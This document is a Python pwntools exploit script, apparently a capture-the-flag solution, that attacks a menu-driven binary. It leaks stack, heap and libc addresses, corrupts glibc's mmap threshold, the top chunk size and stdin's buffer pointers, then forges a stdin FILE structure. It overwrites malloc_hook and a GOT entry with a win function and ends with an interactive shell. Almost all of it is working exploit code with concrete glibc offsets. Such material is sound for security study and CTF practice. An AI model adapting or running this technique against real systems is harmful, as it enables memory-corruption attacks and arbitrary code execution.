from pwn import *
import sys

p = None

def leak(addr):
    p.sendlineafter(b"]>", b"1")
    p.sendline(str(addr).encode())
    p.recvline()
    p.recvline()
    result = p.recvline().decode().strip()
    # print(result)
    result = result.split(": ")[1]
    return int(result, 16) if result != "(nil)" else 0


def leakn(addr, size):
    assert size % 8 == 0
    data = b""
    for i in range(size // 8):
        data += p64(leak(addr + i * 8))
    return data


while True:
    p = process(sys.argv[1:])

    p.sendline(b"1")
    p.sendline(b"a")
    p.recvuntil(b"0x")
    stack = int(p.recvuntil(b":", drop=True), 16)

    # arch glibc 2.31 (outdated as of 2.31-5):
    if args.LOCAL:
        heap_leak = leak(stack - 8 * 7)  # addrs[13]
        libc_leak = leak(stack - 8 * 10)  # addrs[10]
        libc_base = libc_leak - 0x7f5b2a888120 + 0x7f5b2a627000
        heap_base = heap_leak - 0x5609f1c520a0 + 0x5609f3b61000
        exe_base = heap_leak - 0x55b1202070a0 + 0x55b120206000
        win = exe_base - 0x55b120206000 + 0x55b120207199

        TARGET_REGION = libc_base + 0x1bf000

        TARGET_HOOK_OFFSET = 0x9d0
        TARGET_STDIN_OFFSET = 0x7e0

        _IO_2_1_stdin_ = libc_base + 0x1bf7e0
        MP_ = libc_base + 0x1bf0e0
        MAIN_ARENA_TOP_CHUNK_PTR = libc_base - 0x00007feecc5e8000 + 0x7feecc7a7a40

        _IO_stdfile_0_lock = libc_base - 0x00007f18e86e1000 + 0x7f18e88a3330
        __GI__IO_file_jumps = libc_base + 0x1c1300

    # ubuntu19.10 docker (2020-09-03)
    else:
        exe_leak = leak(stack - 8 * 20)
        libc_leak = leak(stack - 8 * 9)

        libc_base = libc_leak - 0x7f7e1e3b0131 + 0x7f7e1e1a9000 - 0x10
        exe_base = exe_leak - 0x562ae43f50a0 + 0x0000562ae43f4000
        win = exe_base - 0x55b120206000 + 0x55b120207199

        TARGET_REGION = libc_base + 0x1ea000

        TARGET_HOOK_OFFSET = 0xb70
        TARGET_STDIN_OFFSET = 0x980

        _IO_2_1_stdin_ = libc_base + 0x1ea980
        MP_ = libc_base + 0x1ea280
        MAIN_ARENA_TOP_CHUNK_PTR = libc_base + 0x1eabe0

        _IO_stdfile_0_lock = libc_base + 0x1ed4d0
        __GI__IO_file_jumps = libc_base + 0x1ec4a0

    MASK = ~0xffff & (1 << 64) - 1
    if TARGET_REGION & MASK != TARGET_REGION:
        log.failure(f"{TARGET_REGION = :#x}")
        p.close()
        continue
    else:
        break
"""
addrs = []
for addr in range(stack - 8 * 100, stack + 8 * 100, 8):
    addrs.append(leak(addr))

for addr in sorted(set(addrs)):
    print(hex(addr), addrs.index(addr))
"""

log.info(f"{stack          = :#x}")
log.info(f"{win            = :#x}")
log.info(f"{libc_leak      = :#x}")
log.success(f"{libc_base      = :#x}")
log.info(f"{_IO_2_1_stdin_ = :#x}")
log.info(f"{TARGET_REGION  = :#x}")

input_buffer = leak(_IO_2_1_stdin_ + 8 * 3)
log.info(f"{input_buffer   = :#x}")
log.info(f"{input_buffer + 0x20 = :x}")

top_chunk = leak(MAIN_ARENA_TOP_CHUNK_PTR)
log.info(f"{top_chunk      = :#x}")

pause()


def nuke(addr):
    # log.info(f"nuke({addr = :#x})")
    p.sendlineafter(b"]> \n", b"2")
    p.sendline(str(addr).encode())


def setup_data(data):
    assert b"1" not in data
    assert b"2" not in data
    p.sendline(b"3")  # defuse menuoption
    p.recvuntil(b"]> \n")
    p.sendline(data)
    for _ in range(len(data)):
        p.recvuntil(b"]> \n")


log.info("mmaping until near TARGET")

nuke(MP_ + 16)  # nuke mmap_threshold
nuke(top_chunk + 8 + 1)  # nuke mchunk_size of top chunk but keep INUSE bit

# malloc will now be mmap!

# note: this loop only requires a single iteration on ubuntu19.10. newer glibcs require multiple iterations
for _ in range(200):
    nuke(_IO_2_1_stdin_ + 8 * 7)  # _IO_buf_base
    input_buffer = leak(_IO_2_1_stdin_ + 8 * 3)
    MASK = ~0xffff & (1 << 64) - 1
    if (input_buffer & MASK) == TARGET_REGION:
        log.success(f"{input_buffer = :#x}")
        break
    log.info(f"{input_buffer = :#x}")
else:
    raise RuntimeError("mmaps not in range!?")

stdin_backup = leakn(_IO_2_1_stdin_, 0xd8)

# now partially overwrite _IO_buf_base of stdin
nuke(_IO_2_1_stdin_ + 8 * 7 - 6)

_s = TARGET_STDIN_OFFSET
data = {
    # dummy input
    0: f"X\n\0".encode(),
    0xb0: p64(win),  # __strlen_avx2@got.plt ?? for ubuntu:19.10
    # fixup _IO_2_1_stdin_
    _s: p64(0xfbad2088) + p64(TARGET_REGION) * 6 + p64(0) * 5,
    _s + 0x60: p64(0),
    _s + 0x82: p8(0),  # _vtable_offset
    _s + 0x88: p64(_IO_stdfile_0_lock),
    _s + 0xc0: p32(0),
    _s + 0xd8: p64(__GI__IO_file_jumps),
    # rip control:
    TARGET_HOOK_OFFSET: p64(win),  # malloc_hook
    0x1000: b"WOWE",
}
data = flat(data, filler=b"X")
print(hexdump(data))
pause()
p.sendline(data)

# triggers malloc in _IO_doallocbuf (__GI__IO_file_doallocate)

p.sendline("id")
p.interactive()
